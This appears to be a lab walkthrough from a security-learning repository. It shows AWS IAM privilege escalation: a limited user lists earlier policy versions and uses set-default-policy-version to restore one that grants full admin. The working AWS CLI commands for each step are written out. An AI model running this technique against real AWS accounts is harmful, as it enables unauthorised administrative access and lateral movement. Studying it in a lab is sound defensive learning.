Starting with a highly-limited IAM user, the attacker is able to review previous IAM policy versions and restore one which allows full admin privileges, resulting in a privilege escalation exploit.

Enumeration:
Who am i ?
```
aws --profile PROFILENAME sts get-caller-identity
```

![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/5c63fd87-90b8-4df3-8082-ae35a60cc688)

Listing the user policies:

![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/bb1ef0b1-da61-42aa-8cf7-aa2add8137a6)

Listing the policy versions:

```
aws --profile PROFILENAME iam list-policy-versions --policy-arn ARN_NAME
```
![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/020d2f6e-3fed-45a1-ace8-3552b98e9db8)

The output of this lets us know that there are 5 versions of our current policy and we are currently using version `v1`. This does not tell us what version `v1` has access to though, to learn that run the following command.

Getting the policy:

```
aws iam get-policy-version --policy-arn <raynor policy arn> --version-id v1
```

![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/d491efb7-bbfe-4c1a-8265-9015c14a9c7a)

Based on the output of the command we can see that all IAM:Get and IAM:List calls will be allowed as well as IAM:SetDefaultPolicyVersion. The important bit is that we can set the default version of our policy. If a previous version has a higher level of access than our current version, we can set that one as the default and gain an elevated level of access.

After looking at the permissions associated with each version, v3 looks to offer us the highest level of permissions.

![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/bd5d6a73-a1c4-4aed-beed-1403a8ae8abe)

We can now escalate privleges with a simple command.

```
aws iam set-default-policy-version --policy-arn <raynor policy arn> --version-id v3
```

![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/de51f171-21e1-486c-bc9b-0f4337a58ed2)

We have now successfully escalated our privileges and from here we can further enumerate for various attack paths to laterally move across the organization. 
